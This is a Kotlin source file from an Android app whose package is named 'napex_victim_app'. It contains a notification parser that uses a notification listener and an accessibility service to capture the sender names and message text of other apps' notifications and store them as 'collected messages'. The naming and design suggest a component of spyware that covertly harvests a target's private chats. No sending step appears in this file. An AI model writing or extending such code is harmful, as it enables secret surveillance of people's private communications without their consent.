package com.napex.napex_victim_app.parser

import android.app.Notification
import android.service.notification.StatusBarNotification

import com.napex.napex_victim_app.services.CollectedMessage

import java.util.UUID

/**
 * محلل الإشعارات — يستخرج (المُرسل، المحتوى) من إشعار
 */
object NotificationParser {

    /// من إشعار شريط الحالة (NotificationListener)
    fun parseStatusBarNotification(sbn: StatusBarNotification): CollectedMessage? {
        val packageName = sbn.packageName ?: return null
        val extras = sbn.notification?.extras ?: return null

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
            ?: return null

        if (text.isBlank()) return null

        return CollectedMessage(
            id = UUID.randomUUID().toString(),
            sender = title ?: "غير معروف",
            content = text.take(1000),
            source = packageName,
            timestamp = sbn.postTime,
            chatName = title,
        )
    }

    /// من إشعار حدث إمكانية الوصول (AccessibilityService)
    fun parseNotification(
        notification: Notification,
        packageName: String,
    ): CollectedMessage? {
        val extras = notification.extras ?: return null

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
            ?: return null

        if (text.isBlank()) return null

        return CollectedMessage(
            id = UUID.randomUUID().toString(),
            sender = title ?: "غير معروف",
            content = text.take(1000),
            source = packageName,
            timestamp = System.currentTimeMillis(),
            chatName = title,
        )
    }
}
